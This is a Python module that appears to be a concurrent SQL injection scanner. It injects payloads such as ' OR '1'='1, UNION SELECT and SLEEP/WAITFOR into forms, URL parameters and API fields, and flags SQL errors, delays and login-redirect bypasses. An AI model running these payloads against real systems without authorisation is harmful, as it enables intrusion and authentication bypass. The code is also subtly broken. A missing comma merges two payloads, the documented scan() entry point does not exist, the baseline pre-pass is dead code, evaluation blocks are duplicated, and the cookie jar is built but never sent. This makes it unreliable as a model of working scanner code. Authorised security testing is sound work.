"""
sqli.py
-------
SQL Injection probe extension — concurrent edition — with auth bypass detection.

Uses asyncio + httpx.AsyncClient to send all probes in parallel.
Detects:
    - Error-based SQLi     (SQL errors leaked in response body)
    - Time-based blind     (SLEEP / WAITFOR delay)
    - Auth bypass          (redirect away from login page on injection)
    - Status anomalies     (unexpected 3xx on form submission)

Usage:
    from parser import parse
    from sqli import scan

    asset    = parse("https://example.com/login")
    findings = scan(asset)
"""

import asyncio
import time
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

import httpx


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    '" OR "1"="1',
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1' ORDER BY 3 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' AND SLEEP(3) --",
    "1; WAITFOR DELAY '0:0:3'",
    "' AND 1=CONVERT(int,'a') --",
    "1' OR '1'='1"
    "' OR 1=1--"
]

ERROR_SIGNATURES = [
    # generic
    "sql syntax",
    "sql error",
    "syntax error",
    "invalid query",
    "division by zero",
    "unclosed quotation",
    "quoted string not properly terminated",
    "unterminated string",
    "supplied argument is not a valid",
    "invalid column name",
    "column not found",
    "error in your sql syntax",
    # mysql
    "mysql_fetch",
    "warning: mysql",
    "mysql server version",
    "com.mysql.jdbc",
    # java / jsp
    "jdbc",
    "java.sql",
    "java.lang",
    "org.apache",
    "hibernate",
    "sqlexception",
    "com.microsoft.sqlserver",
    # oracle
    "ora-",
    "ora-00",
    "ora-01",
    # postgresql
    "postgresql",
    # mssql
    "microsoft ole db",
    "80040e14",
    "80040e07",
    # db2
    "db2 sql error",
    # odbc
    "odbc driver",
    "odbc sql",
    # jdbc generic
    "jdbc driver",
    # sqlite
    "sqlite",
    "syntax error",
    "column",
    "row",
]

# Keywords that indicate a successful login redirect destination
SUCCESS_INDICATORS = [
    "main.jsp",
    "dashboard",
    "welcome",
    "account",
    "logout",
    "signed in",
    "my account",
    "home",
    "portal",
    "overview",
]

# Keywords that identify the source as a login/auth page
LOGIN_INDICATORS = [
    "login",
    "signin",
    "sign-in",
    "auth",
    "session",
]

TIME_THRESHOLD = 2.5
MAX_CONCURRENT = 20  # raise for speed, lower to avoid rate limiting


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def sql(asset: dict) -> dict[str, Any]:
    """Synchronous entry point — runs the async scanner and returns results."""

    return asyncio.run(_scan_async(asset))


async def _scan_async(asset: dict) -> dict[str, Any]:
    jobs = (
        _form_jobs(asset)
        + _param_jobs(asset)
        + _api_jobs(asset)
    )

    total = len(jobs)

    print(f"\n========== SQLi SCAN START ==========")
    print(f"Target  : {asset['target']['final_url']}")
    print(f"Status  : {asset['response']['status_code']}")
    print(f"Forms   : {len(asset.get('forms', []))}")
    print(f"Params  : {len(asset.get('parameters', []))}")
    print(f"API     : {len(asset.get('api', []))}")
    print(f"Probes  : {total}  (concurrency: {MAX_CONCURRENT})")
    print(f"=====================================\n")

    if not jobs:
        print("[-] Nothing to probe on this page.\n")
        return {
            "target":   asset["target"]["final_url"],
            "findings": [],
            "probed":   0,
        }

    start    = time.perf_counter()
    findings = await _run_jobs(jobs, asset)

    unique = {}

    for finding in findings:
        key = (
            finding["source"].get("field_name"),
            finding["triggered_by"][0],
        )

        unique[key] = finding

    findings = list(unique.values())
    elapsed  = time.perf_counter() - start

    print(f"\n========== SQLi SCAN COMPLETE ==========")
    print(f"Probes  : {total}")
    print(f"Hits    : {len(findings)}")
    print(f"Time    : {elapsed:.2f}s  (was ~{total * 0.4:.0f}s sequential)")
    print(f"=========================================\n")

    return {
        "target":   asset["target"]["final_url"],
        "findings": findings,
        "probed":   total,
    }


# ---------------------------------------------------------------------------
# Job builders  (pure data — no I/O)
# ---------------------------------------------------------------------------

def _form_jobs(asset: dict) -> list[dict]:
    """One job per (form × field × payload) combination."""
    jobs = []

    for form in asset.get("forms", []):

        print(
            form["method"],
            form["action"],
            [
                f["name"]
                for f in form["fields"]
            ]
        )

        base_data = _baseline_form_data(form)

        testable = [
            f for f in form["fields"]
            if f["name"]
            and f["type"] not in (
                "hidden",
                "submit",
                "button",
                "image",
            )
        ]

        if not testable:
            continue

        for field in testable:
            for payload in PAYLOADS:

                jobs.append({
                    "url": form["action"],
                    "method": form["method"],
                    "data": {
                        **base_data,
                        field["name"]: payload,
                    },
                    "baseline_data": base_data,
                    "json": None,
                    "payload": payload,
                    "source": {
                        "type": "form",
                        "action": form["action"],
                        "method": form["method"],
                        "field_name": field["name"],
                        "field_type": field["type"],
                    },
                })

    return jobs

def _param_jobs(asset: dict) -> list[dict]:
    """One job per (url parameter × payload) combination."""
    jobs     = []
    base_url = asset["target"]["final_url"]
    for param in asset.get("parameters", []):
        for payload in PAYLOADS:
            injected_url = _inject_url_param(base_url, param["name"], payload)
            jobs.append({
                "url":     injected_url,
                "method":  "GET",
                "data":    None,
                "json":    None,
                "payload": payload,
                "source":  {
                    "type":       "url_parameter",
                    "param_name": param["name"],
                    "url":        injected_url,
                },
            })
    return jobs


def _api_jobs(asset: dict) -> list[dict]:
    """One job per (api endpoint × field × payload) combination."""
    jobs = []
    for endpoint in asset.get("api", []):
        url    = endpoint["url"]
        method = endpoint.get("method", "POST")
        fields = endpoint.get("fields", [])
        for field in fields:
            for payload in PAYLOADS:
                body          = {f: "test" for f in fields}
                body[field]   = payload
                jobs.append({
                    "url":     url,
                    "method":  method,
                    "data":    None,
                    "json":    body,
                    "payload": payload,
                    "source":  {
                        "type":       "api",
                        "url":        url,
                        "method":     method,
                        "field_name": field,
                    },
                })
    return jobs


# ---------------------------------------------------------------------------
# Concurrent runner
# ---------------------------------------------------------------------------

async def _run_jobs(
    jobs: list[dict],
    asset: dict,
) -> list[dict]:
    """Run all jobs concurrently, capped at MAX_CONCURRENT in-flight requests."""
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    cookies   = _cookie_jar(asset)
    done      = 0
    total     = len(jobs)

    async with httpx.AsyncClient(
        follow_redirects=False,
        timeout=httpx.Timeout(connect=5.0, read=12.0, write=5.0, pool=5.0),
    ) as client:
        baselines = {}

        for job in jobs:
            key = (
                job["url"],
                job["method"],
                str(job.get("baseline"))
            )

            if "baseline" in job and key not in baselines:
                baseline_job = {
                    "url": job["url"],
                    "method": job["method"],
                    "data": job["baseline"],
                    "json": None,
                }

                baselines[key] = await _send_async(
                    client,
                    baseline_job,
                    cookies
                )
        async def _run_one(job: dict) -> dict | None:
            nonlocal done

            async with semaphore:

                baseline = None

                # Send normal request first
                if "baseline_data" in job:

                    baseline_job = {
                        "url": job["url"],
                        "method": job["method"],
                        "data": job["baseline_data"],
                        "json": None,
                    }

                    baseline = await _send_async(
                        client,
                        baseline_job,
                        {}
                    )


                # Send SQL injection payload request
                result = await _send_async(
                    client,
                    job,
                    {}
                )


                finding = _evaluate(
                    result,
                    job["payload"],
                    job["source"],
                    baseline
                )


                done += 1

                if done % 10 == 0 or done == total:
                    print(
                        f"  [{done}/{total}] probes sent ...",
                        end="\r"
                    )

                return finding


        results = await asyncio.gather(*[_run_one(j) for j in jobs])

    print()  # newline after progress line
    return [r for r in results if r is not None]

# ---------------------------------------------------------------------------
# Async HTTP sender
# ---------------------------------------------------------------------------

async def _send_async(
    client: httpx.AsyncClient,
    job: dict,
    cookies: dict,
) -> dict[str, Any]:
    method = job["method"].upper()
    url    = job["url"]
    data   = job["data"]
    json   = job["json"]
    start  = time.perf_counter()

    try:
        response = await client.request(
            method  = method,
            url     = url,
            params  = data if method == "GET" else None,
            data    = data if method == "POST" and not json else None,
            json    = json,
            cookies = cookies,
        )
        print("\n========== REQUEST DEBUG ==========")
        print(method, url)
        print(data)
        print("===================================")
        elapsed = time.perf_counter() - start
        if response.status_code in (301, 302, 303):
            print(
                "[REDIRECT]",
                method,
                url,
                "->",
                response.headers.get("location")
            )
        result = {
            "status_code": response.status_code,
            "method": method,
            "url": str(response.url),
            "data": json or data,
            "body": response.text.lower(),
            "headers": {
                k.lower(): v
                for k, v in response.headers.items()
            },
            "elapsed": elapsed,
            "error": None,
        }

    except httpx.TimeoutException:
        result = _error_result(method, url, data, start, "timeout")
        print(f"  [TIMEOUT]       {method} {url}")
    except httpx.ConnectError:
        result = _error_result(method, url, data, start, "connect_error")
        print(f"  [CONNECT ERROR] {method} {url}")
    except httpx.RequestError as exc:
        result = _error_result(method, url, data, start, str(exc))
        print(f"  [REQUEST ERROR] {exc}")
        return result

    # surface interesting non-error responses
    if not result["error"]:
        if result["status_code"] >= 500:
            print(f"  [500]  {method} {url}  ({result['elapsed']:.3f}s)")
        elif result["elapsed"] >= TIME_THRESHOLD:
            print(f"  [SLOW] {method} {url}  ({result['elapsed']:.3f}s)")

    return result


def _error_result(
    method: str,
    url: str,
    data: dict | None,
    start: float,
    error: str,
) -> dict[str, Any]:
    return {
        "status_code": 0,
        "method": method,
        "url": url,
        "data": data,
        "body": "",
        "headers": {},
        "elapsed": time.perf_counter() - start,
        "error": error,
    }


# ---------------------------------------------------------------------------
# Evaluator
# ---------------------------------------------------------------------------

def _evaluate(
    result: dict,
    payload: str,
    source: dict,
    baseline: dict | None = None,
) -> dict[str, Any] | None:
    if result["error"]:
        if result["error"] == "timeout":
            finding = {
                "payload": payload,
                "triggered_by": ["request_timeout"],
                "status_code": result["status_code"],
                "elapsed": round(result["elapsed"], 4),
                "source": source,
            }

            print("\n  [POSSIBLE SQLi]")
            print("  Reason :", "timeout")
            print("  Payload:", payload)
            print("  URL    :", result["url"])
            print()

            return finding

        return None


    triggered_by = []


    # -------------------------
    # Error based SQL injection
    # -------------------------
    for sig in ERROR_SIGNATURES:
        if sig in result["body"]:
            triggered_by.append(
                f"error_signature: {sig}"
            )


    # -------------------------
    # Time based SQL injection
    # -------------------------
    if (
        result["elapsed"] >= TIME_THRESHOLD
        and (
            "SLEEP" in payload.upper()
            or "WAITFOR" in payload.upper()
        )
    ):
        triggered_by.append(
            f"time_based: {result['elapsed']:.2f}s"
        )


    # -------------------------
    # Auth bypass detection
    # -------------------------
# -------------------------
# Redirect difference detection
# -------------------------
    if baseline:

        base_location = baseline["headers"].get(
            "location",
            ""
        )

        test_location = result["headers"].get(
            "location",
            ""
        )

        if (
            result["status_code"] in (301, 302, 303)
            and test_location
            and test_location != base_location
        ):
            triggered_by.append(
                f"redirect_changed: {base_location} -> {test_location}"
            )


    # -------------------------
    # Response change detection
    # -------------------------
# -------------------------
# Response change detection
# -------------------------
    if baseline:

        if result["body"] != baseline["body"]:
            triggered_by.append(
                "response_changed"
            )

        # -------------------------
        # Session cookie change detection
        # -------------------------
        # -------------------------
    # Session cookie change detection
    # -------------------------
    if baseline:

        base_cookies = baseline.get("headers", {}).get(
            "set-cookie",
            ""
        )

        test_cookies = result.get("headers", {}).get(
            "set-cookie",
            ""
        )

        if base_cookies != test_cookies:
            triggered_by.append(
                "session_cookie_changed"
            )


    # -------------------------
    # Status anomalies
    # -------------------------
    if result["status_code"] in (301, 302, 303):

        location = result["headers"].get(
            "location",
            ""
        ).lower()

        if any(
            success in location
            for success in SUCCESS_INDICATORS
        ):
            triggered_by.append(
                f"auth_bypass_redirect: {location}"
            )


    # -------------------------
    # Final decision
    # -------------------------
    if not triggered_by:
        return None


    # -------------------------
    # Status anomalies
    # -------------------------
    if result["status_code"] in (301, 302, 303):

        location = result["headers"].get(
            "location",
            ""
        ).lower()

        if any(
            success in location
            for success in SUCCESS_INDICATORS
        ):
            triggered_by.append(
                f"auth_bypass_redirect: {location}"
        )

# -------------------------
# Response change detection
# -------------------------

    valid_signals = [
        x for x in triggered_by
        if (
            "error_signature" in x
            or "time_based" in x
            or "auth_bypass" in x
            or "redirect_changed" in x
            or "session_cookie_changed" in x
            or "response_changed" in x
        )
    ]

    if not valid_signals:
        return None


    field = source.get(
        "field_name",
        source.get("param_name", "")
    )


    print("\n========== SQLi HIT ==========")
    print("FIELD :", field)
    print("PAYLOAD:", payload)
    print("TRIGGER:", triggered_by)
    print("STATUS :", result["status_code"])
    print("TIME   :", f"{result['elapsed']:.3f}s")
    print("URL    :", result["url"])
    print("==============================\n")


    return {
        "payload": payload,
        "triggered_by": triggered_by,
        "status_code": result["status_code"],
        "elapsed": round(result["elapsed"], 4),
        "source": source,
    }

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _baseline_form_data(form: dict) -> dict[str, str]:
    """Seed payload with all existing field values — preserves hidden CSRF tokens."""
    return {f["name"]: f["value"] for f in form["fields"] if f["name"]}


def _inject_url_param(url: str, name: str, value: str) -> str:
    parsed       = urlparse(url)
    params       = parse_qs(parsed.query, keep_blank_values=True)
    params[name] = [value]
    new_query    = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _cookie_jar(asset: dict) -> dict[str, str]:
    return {c["name"]: c["value"] for c in asset["response"]["cookies"]}